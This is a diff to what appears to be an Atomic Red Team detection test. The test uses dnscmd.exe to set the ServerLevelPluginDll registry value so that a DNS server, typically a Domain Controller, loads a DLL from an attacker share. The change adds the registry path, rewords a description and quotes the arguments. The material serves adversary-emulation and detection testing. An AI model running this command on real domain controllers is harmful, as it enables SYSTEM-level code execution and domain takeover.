@@ -40,7 +40,7 @@ atomic_tests:
     This module runs the Microsoft tool DnsCmd in order to install a malicious DLL onto a DNS server (this service is usually carried by a Domain Controller).
     DnsCmd is available either with the Remote Server Administration Tools (https://www.microsoft.com/en-US/download/details.aspx?id=45520) or in "Features on Demand" since Windows 10.
     Computer must be domain-joined and running with an account that is a member of some specific group (DnsAdmins is expected for the exact exploitation, but this can also work as a Domain Admins).
-    Remark: there is no need for a proper DLL path for triggering the detection. I.e. the registry of the remote server will be updated with this path, whether or not it is valid. But for real exploitation, the DLL has to follow some conditions and the network path needs to be reachable.
+    Remark: there is no need for a proper DLL path for triggering the detection. I.e. the registry of the remote server (`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll`) will be updated with this path, whether or not it is valid. But for real exploitation, the DLL has to follow some conditions and the network path needs to be reachable.
   supported_platforms:
   - windows
   input_arguments:
@@ -49,7 +49,7 @@ atomic_tests:
       type: string
       default: DNS.DOMAIN.CORP
     dll_path:
-      description: DLL to provide for the DNS server
+      description: Path to the DLL that the DNS server will attempt to load
       type: string
       default: \\AttackWks\share\attack.dll
   dependency_executor_name: powershell
@@ -81,4 +81,4 @@ atomic_tests:
     name: command_prompt
     elevation_required: false
     command: |
-      dnscmd.exe #{target_dns} /config /ServerLevelPluginDll #{dll_path}
+      dnscmd.exe "#{target_dns}" /config /ServerLevelPluginDll "#{dll_path}"
